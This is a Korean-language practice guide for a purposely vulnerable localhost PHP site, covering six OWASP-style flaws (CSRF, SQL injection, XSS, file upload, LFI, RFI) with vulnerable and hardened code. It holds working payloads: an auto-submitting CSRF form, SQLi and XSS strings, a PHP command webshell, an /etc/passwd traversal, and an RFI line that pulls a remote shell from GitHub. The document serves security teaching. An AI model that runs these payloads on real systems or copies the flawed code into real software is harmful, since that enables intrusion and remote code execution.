# 웹 보안 취약점 실습 가이드

이 문서는 웹 보안 실습 플랫폼에서 OWASP Top 10 취약점을 안전하게 테스트하는 방법을 안내합니다.

---

## 🎯 테스트 환경 설정

### 1. 기본 접속 정보
- **웹사이트**: http://localhost:8080
- **보안 설정 제어판**: http://localhost:8080/security.php
- **게시판**: http://localhost:8080/board/list.php

### 2. 권한별 테스트 계정
| 권한 | 사용자명 | 비밀번호 | 설명 |
|------|----------|----------|------|
| 👑 관리자 | `admin` | `admin123` | 모든 기능 접근 가능 |
| 👤 일반사용자 | `user` | `user123` | 기본 기능 사용 가능 |
| 👻 게스트 | `guest` | `guest123` | 읽기 전용 접근 |

### 3. 보안 설정 제어
**중요**: 각 취약점 테스트 전에 `http://localhost:8080/security.php`에서 해당 보안 기능을 OFF로 설정하세요.

---

## 🔐 1. CSRF (Cross-Site Request Forgery)

### 💡 근본적 원인
사용자의 브라우저에 저장된 인증 정보(세션 쿠키)를 이용하여 사용자 모르게 악의적인 요청을 전송하는 공격입니다. 웹 애플리케이션이 요청의 출처를 검증하지 않고 단순히 인증된 사용자의 요청으로만 판단하기 때문에 발생합니다.

### 📍 취약한 위치
- **취약 경로**: `web/board/write.php`, `web/board/view.php`
- **세부 위치**: `write.php:34-37`, `view.php:32-36`

### 📝 취약 코드 예제

#### **취약한 코드 (CSRF 보호 비활성화시) - `web/board/write.php:32-56`**
```php
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['content'])) {
    // CSRF 대책: POST 요청 시 토큰 검증
    if ($csrf_protection) {
        if (!isset($_POST['token']) || $_POST['token'] !== $_SESSION['token']) {
            die('CSRF token validation failed.');
        }
    }
    // ℹ️ csrf_protection = false일 때 위 검증이 건너뛰어짐 - 취약점!
    
    $content = $_POST['content'];
    $title = isset($_POST['title']) ? $_POST['title'] : '제목 없음';
    $author = $_SESSION['username'];
    
    $stmt = $conn->prepare("INSERT INTO posts (title, content, author) VALUES (?, ?, ?)");
    $stmt->bind_param("sss", $title, $content, $author);
    $stmt->execute();
    
    header("Location: list.php");
    exit;
}
```

#### **보안이 강화된 코드 (CSRF 보호 활성화시) - `web/board/write.php:174-184`**
```php
// CSRF 대책: 폼에 숨겨진 토큰 추가
if ($csrf_protection) {
    if (empty($_SESSION['token'])) {
        $_SESSION['token'] = bin2hex(random_bytes(32));  // 32바이트 랜덤 토큰
    }
    $token = $_SESSION['token'];
} else {
    $token = '';
}
?>
<input type="hidden" name="token" value="<?php echo $token; ?>">
```

### 🛡️ 보안 설정
1. `http://localhost:8080/security.php` 접속
2. **🔗 게시판 통합 페이지 설정** 박스에서
3. **CSRF 토큰 보호** OFF로 설정

### 🎯 실습 방법

#### **방법 1: 취약한 페이지 **
1. **로그인** (admin/admin123 또는 user/user123)
2. **공격 페이지 접속**: `http://localhost:8080/uploads/csrf_attack.html`
3. "Click Here!" 버튼 클릭 또는 3초 후 자동 실행
4. **결과 확인**: `http://localhost:8080/board/list.php`에서 공격 게시글 확인
```
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack Test</title>
</head>
<body>
    <h1>CSRF Attack Demo</h1>

    <form action="http://localhost:8080/board/write.php" method="POST">
        <input type="hidden" name="title" value="🚨 CSRF 공격 성공!" />
        <input type="hidden" name="content" value="CSRF Attack Post - 이 글은 CSRF 공격으로 작성되었습니다! 사용자가 모 르는 사이에 게시글이 작성되었습니다." />
        <input type="submit" value="Click Here!" />
    </form>

    <p>위 버튼을 클릭하면 CSRF 공격이 실행됩니다.</p>

    <!-- 자동 실행 (페이지 로드 시) -->
    <script>
        // 3초 후 자동으로 폼 제출
        setTimeout(function() {
            document.forms[0].submit();
        }, 3000);
    </script>
</body>
</html>
```

### 🛡️ 보안 대책

#### **현재 구현된 대책**
1. **CSRF 토큰 기반 보호** (`csrf_protection`)
   - **원리**: 각 세션마다 고유한 랜덤 토큰을 생성하여 요청 시 검증
   - **구현**: `$_SESSION['csrf_token']`과 요청 토큰 비교
   - **효과**: 정당한 사이트에서만 요청 가능, 외부 사이트에서의 공격 차단

#### **추가 검토 가능한 대책**
2. **Referer 헤더 검증**
   - **원리**: 요청의 출처 URL을 확인하여 동일 도메인에서만 요청 허용
   - **한계**: Referer 헤더는 조작이 가능하고 일부 환경에서 전송되지 않을 수 있음

3. **SameSite 쿠키 속성**
   - **원리**: 쿠키에 SameSite=Strict 또는 Lax 설정으로 크로스 사이트 요청 시 쿠키 전송 제한
   - **구현**: `session_set_cookie_params(['samesite' => 'Strict'])`
   - **효과**: 브라우저 레벨에서 CSRF 공격 원천 차단

---

## 💉 2. SQL Injection

### 💡 근본적 원인
사용자 입력값을 SQL 쿼리에 직접 연결(concatenation)하여 실행할 때 발생합니다. 입력값에 대한 적절한 검증과 이스케이프 처리 없이 동적 SQL을 생성하면, 공격자가 SQL 구문을 조작하여 데이터베이스를 임의로 조작할 수 있습니다.

### 📍 취약한 위치
- **게시글 상세보기**: `web/board/view.php:83`
- **게시글 검색**: `web/board/list.php:49`

### 📝 취약 코드 예제

#### **취약한 코드 (SQL 인젝션 보호 비활성화시)**

**1. 게시글 상세보기 - `web/board/view.php:78-82`**
```php
// 특정 게시글 가져오기
if ($sql_protection) {
    // SQL 인젝션 대책: Prepared Statements 사용
    $stmt = $conn->prepare("SELECT * FROM posts WHERE id = ?");
    $stmt->bind_param("i", $post_id);
    $stmt->execute();
    $result = $stmt->get_result();
} else {
    // SQL Injection 취약 - 사용자 입력을 직접 쿼리에 연결!
    $sql = "SELECT * FROM posts WHERE id = $post_id";
    $result = $conn->query($sql);
}
```

**2. 게시글 검색 - `web/board/list.php:35-45`**
```php
// 검색 기능 처리
$search_query = isset($_GET['search']) ? $_GET['search'] : '';
$search_condition = '';

if (!empty($search_query)) {
    if ($search_sql_protection) {
        // SQL 인젝션 대책: Prepared Statements 사용
        $search_condition = " WHERE title LIKE ? OR content LIKE ? OR author LIKE ?";
        $search_like = "%$search_query%";
        $search_params = [$search_like, $search_like, $search_like];
    } else {
        // 🚨 SQL Injection 취약점: 사용자 입력이 직접 SQL 쿼리에 삽입됨
        $search_condition = " WHERE title LIKE '%$search_query%' OR content LIKE '%$search_query%' OR author LIKE '%$search_query%'";
    }
}
```

**3. 댓글 작성 - `web/board/view.php:45-55`**
```php
// 댓글 작성
if (isset($_POST['comment']) && isset($_POST['post_id'])) {
    $comment = $_POST['comment'];
    $post_id = (int)$_POST['post_id'];
    
    if ($sql_protection) {
        // SQL 인젝션 대책: Prepared Statements 사용
        $stmt = $conn->prepare("INSERT INTO comments (post_id, username, content) VALUES (?, ?, ?)");
        $stmt->bind_param("iss", $post_id, $username, $comment);
        $stmt->execute();
    } else {
        // SQL Injection 취약 - 직접 문자열 연결!
        $sql = "INSERT INTO comments (post_id, username, content) VALUES ('$post_id', '$username', '$comment')";
        $conn->query($sql);
    }
}
```

#### **보안이 강화된 코드 (SQL 인젝션 보호 활성화시)**

**Prepared Statements 사용 - `web/board/list.php:82-87`**
```php
// 현재 페이지의 게시글 가져오기 (검색 조건 포함, 최신순 정렬)
if (!empty($search_query) && $search_sql_protection) {
    // Prepared Statement로 메인 쿼리
    $main_stmt = $conn->prepare("SELECT * FROM posts" . $search_condition . " ORDER BY created_at DESC LIMIT ? OFFSET ?");
    $main_stmt->bind_param("sssii", $search_params[0], $search_params[1], $search_params[2], $posts_per_page, $offset);
    $main_stmt->execute();
    $result = $main_stmt->get_result();
} else {
    // 기존 방식 (취약하거나 검색 없음)
    $sql = "SELECT * FROM posts" . $search_condition . " ORDER BY created_at DESC LIMIT $posts_per_page OFFSET $offset";
    $result = $conn->query($sql);
}
```

### 🛡️ 보안 설정
1. `http://localhost:8080/security.php` 접속
2. **📝 게시판 뷰 페이지 설정**: **SQL 인젝션 방지** OFF
3. **📋 게시판 리스트 페이지 설정**: **SQL 인젝션 방지 (검색기능)** OFF

### 🎯 실습 방법

#### **방법 1: time-based blind sqli **
```
http://localhost:8080/board/list.php?search=admin%27%20OR%20SLEEP(2)--%20
```


### 🛡️ 보안 대책

#### **현재 구현된 대책**
1. **Prepared Statements (PDO)** (`sql_protection`, `search_sql_protection`)
   - **원리**: SQL 쿼리와 데이터를 분리하여 처리, 데이터를 리터럴로만 취급
   - **구현**: `$stmt = $pdo->prepare("SELECT * FROM posts WHERE id = ?"); $stmt->execute([$id]);`
   - **효과**: SQL 구문이 미리 결정되어 데이터가 SQL 명령으로 해석되지 않음

#### **추가 검토 가능한 대책**
2. **입력값 검증 및 필터링**
   - **원리**: 예상 범위 외의 문자나 패턴을 사전 차단
   - **구현**: 정규표현식, 화이트리스트 기반 검증
   - **효과**: 악성 SQL 쿼리 패턴 차단

3. **최소 권한 원칙**
   - **원리**: 데이터베이스 사용자에게 필요한 최소한의 권한만 부여
   - **구현**: 애플리케이션 전용 DB 계정, DROP/ALTER 등 DDL 명령 차단
   - **효과**: SQL 인젝션 성공 시에도 피해 범위 최소화

4. **WAF (Web Application Firewall)**
   - **원리**: 애플리케이션 레벨에서 SQL 인젝션 패턴 탐지 및 차단
   - **구현**: ModSecurity, Cloudflare WAF 등
   - **효과**: 알려진 SQL 인젝션 패턴 실시간 차단

---

## 🚨 3. XSS (Cross-Site Scripting)

### 💡 근본적 원인
사용자가 입력한 데이터를 웹 페이지에 출력할 때 적절한 인코딩이나 필터링 없이 그대로 렌더링하기 때문에 발생합니다. HTML, JavaScript 등의 악성 코드가 브라우저에서 실행되어 쿠키 탈취, 세션 하이재킹 등의 공격이 가능해집니다.

### 📍 취약한 위치

#### **💾 Stored XSS (저장형)**
- **게시글 내용 출력**: `web/board/view.php:124-126`
- **댓글 내용 출력**: `web/board/view.php:185-188`
- **게시판 목록**: `web/board/list.php:142-148`

#### **🔄 Reflected XSS (반사형)**
- **검색 결과 표시**: `web/board/list.php:192`
- **검색 입력 필드**: `web/board/list.php:202`

### 📝 취약 코드 예제

#### **취약한 코드 (XSS 보호 비활성화시)**

**1. Stored XSS - 게시글 내용 출력 `web/board/view.php:118-126`**
```php
<div style='line-height: 1.6;'>
    <?php if ($xss2_protection): ?>
        <?php //XSS 대책2 : htmlspecialchars 적용 ?>
        <?php echo htmlspecialchars($post['content'], ENT_QUOTES, 'UTF-8'); ?>
    <?php else: ?>
        <?php echo $post['content']; ?> <!-- XSS 취약점 - 사용자 입력을 그대로 출력! -->
    <?php endif; ?>
</div>
```

**2. Stored XSS - 댓글 내용 출력 `web/board/view.php:180-187`**
```php
<div style="line-height: 1.4;">
    <?php if ($xss2_protection): ?>
        <?php echo htmlspecialchars($comment['content'], ENT_QUOTES, 'UTF-8'); ?>
    <?php else: ?>
        <?php echo $comment['content']; ?> <!-- XSS 취약 지점 - 댓글에서 스크립트 실행 가능! -->
    <?php endif; ?>
</div>
```

**3. Stored XSS - 게시판 목록 `web/board/list.php:134-143`**
```php
// XSS 대책2 : HTML 엔티티 인코딩
if ($xss2_protection) {
    echo htmlspecialchars($row["title"]) . "</strong><br>";
    echo "<small>작성자: " . htmlspecialchars($row["author"]) . "</small><br>";
    echo htmlspecialchars(substr($row["content"], 0, 50)) . (strlen($row["content"]) > 50 ? "..." : "");
} else {
    echo $row["title"] . "</strong><br>";          // XSS 취약!
    echo "<small>작성자: " . $row["author"] . "</small><br>";  // XSS 취약!
    echo substr($row["content"], 0, 50) . (strlen($row["content"]) > 50 ? "..." : "");  // XSS 취약!
}
```

**4. Reflected XSS - 검색 결과 표시 `web/board/list.php:188-196`**
```php
<div style="background: #d4edda; color: #155724; padding: 10px; border-radius: 5px; margin-bottom: 15px; text-align: center;">
    <?php if ($xss2_protection): ?>
        "<strong><?php echo htmlspecialchars($search_query, ENT_QUOTES, 'UTF-8'); ?></strong>" 검색 결과: <?php echo $total_posts; ?>개 게시글
    <?php else: ?>
        "<strong><?php echo $search_query; ?></strong>" 검색 결과: <?php echo $total_posts; ?>개 게시글 <!-- Reflected XSS 취약점 -->
    <?php endif; ?>
</div>
```

**5. Reflected XSS - 검색 입력 필드 `web/board/list.php:200-204`**
```php
<input type="text" 
       name="search" 
       value="<?php echo $xss2_protection ? htmlspecialchars($search_query, ENT_QUOTES, 'UTF-8') : $search_query; ?>" 
       placeholder="제목, 내용, 작성자로 검색..." 
       style="padding: 10px; border: 2px solid #ccc; border-radius: 5px; width: 300px; font-size: 14px;">
       <!-- ℹ️ xss2_protection = false일 때 인코딩 없이 출력 - 취약점! -->
```

#### **보안이 강화된 코드 (XSS 보호 활성화시)**

**XSS 대책1 - HTTP 헤더 설정 `web/board/view.php:22-26`**
```php
//XSS 대책1 : 응답의 문자 인코딩 지정
if ($xss1_protection) {
    header("Content-Type: text/html; charset=UTF-8");
}
```

**XSS 대책2 - 출력 인코딩 `web/board/view.php:119-121`**
```php
<?php if ($xss2_protection): ?>
    <?php //XSS 대책2 : htmlspecialchars 적용 ?>
    <?php echo htmlspecialchars($post['content'], ENT_QUOTES, 'UTF-8'); ?>
<?php endif; ?>
```

### 🛡️ 보안 설정
1. `http://localhost:8080/security.php` 접속
2. **🔗 게시판 통합 페이지 설정**에서
3. **XSS 대책1 - 응답 인코딩** OFF
4. **XSS 대책2 - 출력 필터링** OFF

### 🎯 실습 방법

#### **💾 Stored XSS - 게시글 작성**
1. 새 글 작성에서 다음 입력:
```html
<script>alert("Stored XSS 공격!");</script>
```
2. 게시글 저장 후 상세보기에서 스크립트 실행 확인

#### **💾 Stored XSS - 댓글 작성**
1. 게시글 댓글에 다음 입력:
```html
<img src="x" onerror="alert('저장된 XSS!')">
```
2. 댓글 작성 후 페이지 새로고침하여 스크립트 실행 확인

#### **🔄 Reflected XSS - 검색 기능**
1. **URL 직접 접근**:
```
http://localhost:8080/board/list.php?search=<script>alert("Reflected XSS!");</script>
```

2. **입력 필드 공격**:
```
http://localhost:8080/board/list.php?search="><script>alert("XSS")</script>
```

 공격 유형 | 저장 위치 | 지속성 | 영향 범위 | 탐지 난이도 |
|-----------|-----------|--------|-----------|-------------|
| **Stored XSS** | 데이터베이스 | 영구적 | 해당 게시글을 보는 모든 사용자 | 쉬움 |
| **Reflected XSS** | URL 파라미터 | 일시적 | 악성 URL을 클릭한 사용자만 | 어려움 |



### 🛡️ 보안 대책

#### **현재 구현된 대책**
1. **출력 인코딩** (`xss1_protection`, `xss2_protection`)
   - **원리**: 사용자 데이터를 HTML 문맥에 출력할 때 HTML 엔티티로 변환
   - **구현**: `htmlspecialchars($data, ENT_QUOTES, 'UTF-8')` 사용
   - **효과**: `<script>` 태그가 `&lt;script&gt;`로 변환되어 브라우저에서 코드로 인식되지 않음

#### **추가 검토 가능한 대책**
2. **내용 보안 정책 (CSP)**
   - **원리**: HTTP 헤더로 허용되는 스크립트 출처를 제한
   - **구현**: `Content-Security-Policy: script-src 'self'` 헤더 설정
   - **효과**: 외부 스크립트 로딩 및 인라인 스크립트 실행 차단

3. **입력 검증 및 살균 (Input Validation & Sanitization)**
   - **원리**: 사용자 입력에서 위험한 태그나 스크립트를 사전 제거
   - **구현**: HTML 태그 파싱 및 화이트리스트 기반 필터링
   - **효과**: 지정된 태그와 속성만 허용하여 악성 코드 차단

4. **HttpOnly 쿠키 설정**
   - **원리**: 쿠키에 HttpOnly 플래그 설정하여 JavaScript로 접근 불가
   - **구현**: `session_set_cookie_params(['httponly' => true])`
   - **효과**: XSS 공격 성공 시에도 세션 쿠키 탈취 방지

---

## 📤 4. File Upload Vulnerabilities

### 💡 근본적 원인
파일 업로드 기능에서 파일의 확장자, MIME 타입, 내용 등을 적절히 검증하지 않기 때문에 발생합니다. 악성 스크립트 파일(웹셸)을 업로드하여 서버에서 실행할 수 있게 되면, 시스템 전체를 장악할 수 있는 치명적인 취약점입니다.

### 📍 취약한 위치
- **파일 업로드**: `web/upload.php`

### 🛡️ 보안 설정
1. **📤 파일 업로드 페이지 설정**
2. **파일 확장자 검사** OFF
3. **MIME 타입 검사** OFF

### 🎯 실습 방법

#### **웹셸 업로드**
1. 다음 내용으로 `shell.php` 파일 생성:
```php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

2. `upload.php`에서 파일 업로드
3. 업로드된 파일 실행:
```
http://localhost:8080/uploads/shell.php?cmd=ls -la
http://localhost:8080/uploads/shell.php?cmd=whoami
```

#### **이미지 위장 공격**
1. `.jpg.php` 확장자로 웹셸 업로드 시도
2. MIME 타입 조작하여 우회 시도

### 🛡️ 보안 대책

#### **현재 구현된 대책**
1. **파일 확장자 검증** (`file_extension_check`)
   - **원리**: 허용된 파일 확장자 목록(jpg, png, gif 등)에 있는 파일만 업로드 허용
   - **구현**: 화이트리스트 기반 확장자 검사, 대소문자 처리 포함
   - **효과**: .php, .jsp 등 실행 가능 파일 차단

2. **MIME 타입 검증** (`file_mime_check`)
   - **원리**: 파일의 실제 내용과 선언된 MIME 타입 일치 여부 확인
   - **구현**: `finfo_file()` 함수로 실제 파일 타입 감지
   - **효과**: 위장된 이미지 파일(.jpg.php) 차단

#### **추가 검토 가능한 대책**
3. **파일 업로드 경로 분리**
   - **원리**: 업로드 디렉토리를 웹 루트 밖에 위치하거나 실행 권한 제거
   - **구현**: 첨부 전용 디렉토리 사용, .htaccess로 PHP 실행 차단
   - **효과**: 업로드된 스크립트의 직접 실행 방지

4. **파일 크기 제한**
   - **원리**: 업로드 파일 크기를 제한하여 DoS 공격 방지
   - **구현**: `upload_max_filesize`, `post_max_size` 설정
   - **효과**: 대용량 파일로 인한 서버 자원 고갈 방지

5. **파일명 무작위화**
   - **원리**: 업로드된 파일명을 무작위 문자열로 변경
   - **구현**: `uniqid()` 또는 `hash()` 함수로 파일명 생성
   - **효과**: 직접 파일 경로 추측 및 접근 방지

---

## 📁 5. LFI (Local File Inclusion)

### 💡 근본적 원인
사용자 입력값을 파일 경로로 사용할 때 적절한 경로 검증을 하지 않기 때문에 발생합니다. 디렉토리 트래버셜(../)을 통해 시스템의 중요한 파일(/etc/passwd, 설정 파일 등)에 접근하거나 로그 파일 등을 통한 코드 실행이 가능해집니다.

### 📍 취약한 위치
- **파일 뷰어**: `web/file_viewer.php`

### 📝 취약 코드 예제

#### **취약한 코드 (LFI 보호 비활성화시)**
```php
// file_viewer.php - 사용자 입력 경로를 그대로 사용
$file = $_GET['file'];

// 경로 검증 없이 파일 접근 - 취약점!
if (file_exists($file)) {
    $content = file_get_contents($file);
    echo "<pre>" . htmlspecialchars($content) . "</pre>";
} else {
    echo "파일을 찾을 수 없습니다.";
}
```

#### **보안이 강화된 코드 (LFI 보호 활성화시)**
```php
// file_viewer.php - 디렉토리 트래버셜 방지
$file = $_GET['file'];

// '../' 패턴 검사
if (strpos($file, '../') !== false) {
    die("부적절한 경로입니다.");
}

// 허용된 디렉토리 내의 파일만 접근 허용
$allowedDir = '/var/www/html/uploads/';
$fullPath = realpath($allowedDir . $file);

if (!$fullPath || strpos($fullPath, $allowedDir) !== 0) {
    die("접근이 거부되었습니다.");
}

if (file_exists($fullPath)) {
    $content = file_get_contents($fullPath);
    echo "<pre>" . htmlspecialchars($content) . "</pre>";
} else {
    echo "파일을 찾을 수 없습니다.";
}
```

### 🛡️ 보안 설정
1. **👁️ 파일 뷰어 페이지 설정**
2. **디렉토리 트레버셜 방지 (LFI)** OFF

### 🎯 실습 방법

#### **LFI (Local File Inclusion)**
```
http://localhost:8080/file_viewer.php?file=../../../../etc/passwd
```

### 🛡️ 보안 대책

#### **현재 구현된 대책**
1. **디렉토리 트래버셜 방지** (`lfi_protection`)
   - **원리**: 파일 경로에서 '../' 패턴을 차단하여 상위 디렉토리 접근 방지
   - **구현**: 입력 경로에서 `../` 패턴 탐지 및 차단
   - **효과**: 시스템 파일(/etc/passwd) 접근 방지

#### **추가 검토 가능한 대책**
2. **경로 정규화 (Path Normalization)**
   - **원리**: 입력된 경로를 절대 경로로 변환하여 `../` 패턴 제거
   - **구현**: `realpath()` 함수로 경로 정규화 후 허용 디렉토리 내에 있는지 확인
   - **효과**: 다양한 형태의 디렉토리 트래버셜 공격 차단

3. **화이트리스트 기반 파일 접근**
   - **원리**: 허용된 파일 목록만 접근 가능하도록 제한
   - **구현**: 미리 정의된 파일 명 배열에서만 선택 허용
   - **효과**: 시스템 파일(/etc/passwd) 접근 방지

4. **가상화 환경 (Sandboxing)**
   - **원리**: 파일 접근을 제한된 디렉토리 내로 제한
   - **구현**: chroot jail, Docker 컨테이너 등 격리 환경 사용
   - **효과**: 중요 시스템 파일에 대한 물리적 접근 차단

---

## 🌐 6. RFI (Remote File Inclusion)

### 💡 근본적 원인
외부 URL을 통해 파일을 포함시킬 때 URL의 안전성을 검증하지 않기 때문에 발생합니다. 공격자가 제어하는 외부 서버의 악성 스크립트를 포함시켜 실행할 수 있게 되어, 원격 코드 실행 취약점으로 이어질 수 있습니다.

### 📍 취약한 위치
- **파일 뷰어**: `web/file_viewer.php`

### 📝 취약 코드 예제

#### **취약한 코드 (RFI 보호 비활성화시)**
```php
// file_viewer.php - 원격 URL 포함 검증 없이 사용
$file = $_GET['file'];

// 원격 URL 검증 없이 파일 포함 - 취약점!
if (file_exists($file)) {
    include $file; // 원격 스크립트 실행 가능!
} else {
    echo "파일을 찾을 수 없습니다.";
}
```

#### **보안이 강화된 코드 (RFI 보호 활성화시)**
```php
// file_viewer.php - 원격 URL 패턴 차단
$file = $_GET['file'];

// 원격 URL 패턴 검사
$remotePatterns = ['http://', 'https://', 'ftp://', 'ftps://'];
foreach ($remotePatterns as $pattern) {
    if (strpos(strtolower($file), $pattern) !== false) {
        die("원격 URL 접근이 차단되었습니다.");
    }
}

// 로컬 파일만 처리
$allowedDir = '/var/www/html/uploads/';
$fullPath = realpath($allowedDir . $file);

if (!$fullPath || strpos($fullPath, $allowedDir) !== 0) {
    die("접근이 거부되었습니다.");
}

// include 대신 파일 내용만 읽기
if (file_exists($fullPath)) {
    $content = file_get_contents($fullPath);
    echo "<pre>" . htmlspecialchars($content) . "</pre>";
} else {
    echo "파일을 찾을 수 없습니다.";
}
```

### 🛡️ 보안 설정
1. **👁️ 파일 뷰어 페이지 설정**
2. **원격 파일 포함 방지 (RFI)** OFF

### 🎯 실습 방법

#### **RFI (Remote File Inclusion)**
```
http://localhost:8080/file_viewer.php?file=https://raw.githubusercontent.com/zithub0/web_security/main/web/uploads/shell.phtml&cmd=pwd
http://localhost:8080/file_viewer.php?file=http://localhost/uploads/shell.phtml&cmd=pwd
```

### 🛡️ 보안 대책

#### **현재 구현된 대책**
1. **원격 URL 패턴 차단** (`rfi_protection`)
   - **원리**: http://, https://, ftp:// 등 원격 URL 패턴을 탐지하여 차단
   - **구현**: 입력값에서 원격 URL 스킴 패턴 검사
   - **효과**: 외부 서버의 악성 스크립트 포함 방지

#### **추가 검토 가능한 대책**
2. **allow_url_include 비활성화**
   - **원리**: PHP 설정에서 원격 URL로부터 파일 포함 기능 완전 비활성화
   - **구현**: `php.ini`에서 `allow_url_include = Off` 설정
   - **효과**: include/require 함수로 원격 URL 접근 원천 차단

3. **네트워크 접근 제어**
   - **원리**: 애플리케이션 서버의 아웃바운드 네트워크 접근을 제한
   - **구현**: 방화벽 규칙, 웹 애플리케이션 방화벽(WAF) 사용
   - **효과**: 외부 악성 서버와의 통신 자체를 물리적으로 차단

4. **파일 포함 함수 대안 사용**
   - **원리**: include/require 대신 더 안전한 파일 처리 방법 사용
   - **구현**: 파일 내용을 읽어서 처리하는 방식으로 변경
   - **효과**: 파일 포함으로 인한 코드 실행 위험 원천 차단

---

